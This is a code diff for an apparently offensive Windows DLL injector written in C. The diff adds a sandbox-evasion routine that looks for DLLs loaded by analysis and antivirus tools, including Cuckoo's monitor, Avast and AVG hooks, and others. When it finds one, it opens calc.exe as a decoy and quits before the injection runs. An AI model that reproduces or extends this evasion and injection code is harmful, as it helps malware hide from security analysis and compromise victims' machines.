@@ -1,10 +1,24 @@
 #include <windows.h>
 #include <psapi.h>
 #include <stdio.h>
+#include <stdbool.h>
 
 // Function Prototypes
 typedef NTSTATUS(NTAPI* pSysAlloc)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS(NTAPI* pSysWrite)(HANDLE, PVOID, PVOID, ULONG, PULONG);
+
+// Function to launch calc.exe
+void LaunchCalc() {
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+
+    if (CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
 
 // Function to Resolve APIs
 FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
@@ -102,8 +116,50 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     printf("[*] Successfully injected module @ %p\n", hRemMod);
 }
 
+//SandBox evasion
+bool CheckSandBox() {
+    const char* realDLLs[] = {
+        "kernel32.dll",
+        "networkexplorer.dll",
+        "NlsData0000.dll"
+    };
+
+    const char* sandboxDLLs[] = {
+        "cmdvrt.32.dll",
+        "cuckoomon.dll",
+        "cmdvrt.64.dll",
+        "pstorec.dll",
+        "avghookx.dll",
+        "avghooka.dll",
+        "snxhk.dll",
+        "api_log.dll",
+        "dir_watch.dll",
+        "wpespy.dll"
+    };
+    
+    for (int i = 0; i < sizeof(realDLLs) / sizeof(realDLLs[0]); i++) {
+        if (!LoadLibraryA(realDLLs[i])) { 
+            LaunchCalc();
+            return true;
+        }
+    }
+
+    for (int i = 0; i < sizeof(sandboxDLLs) / sizeof(sandboxDLLs[0]); i++) {
+        if (GetModuleHandle(sandboxDLLs[i])) {
+            LaunchCalc();
+            return true;
+        }
+    }
+
+    return false;
+}
+
 // Entry Function
 int main(int argc, char* argv[]) {
+    if (CheckSandBox()) {
+        return 0;
+    }
+    
     if (argc != 2) {
         printf("Usage: %s <DLL Path>\n", argv[0]);
         return -1;
